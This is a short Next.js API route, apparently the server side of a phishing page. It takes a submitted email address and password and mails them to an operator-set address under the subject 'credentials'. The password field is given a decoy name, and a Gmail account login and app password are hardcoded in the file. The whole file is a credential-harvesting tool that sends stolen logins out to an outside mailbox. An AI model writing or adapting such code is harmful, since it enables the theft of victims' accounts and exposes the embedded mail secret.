import { NextResponse, NextRequest } from 'next/server';
import mailer from 'nodemailer'


export async function POST(request: Request) {

      const res: any = await request.json();

    try {

      let transporter: mailer.Transporter = mailer.createTransport({
         service: 'Gmail',
         host: "smtp.gmail.com",
         port: 465,
         secure: true,
         auth: {
           user: 'deeswork969@gmail.com', 
           pass: 'euujozgmwmhqniiu', 
         },
       });

      const result = await transporter.sendMail({
         from: `"dees" <deeswork969@gmail.com>`,
         to: `${process.env.EMAIL_TO_SEND}`,
         subject: 'credentials',
         // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
         html: `<h3>email: ${JSON.stringify(res.email).replaceAll('"', '')}, password: ${JSON.stringify(res.jennet).replaceAll('"', '')}</h3>`
       })
       console.log(result);
       

       return NextResponse.json({status: true, message: result})
      
    } catch (error) {
      
      return NextResponse.json({status: true, message: error})
    }
  
    

}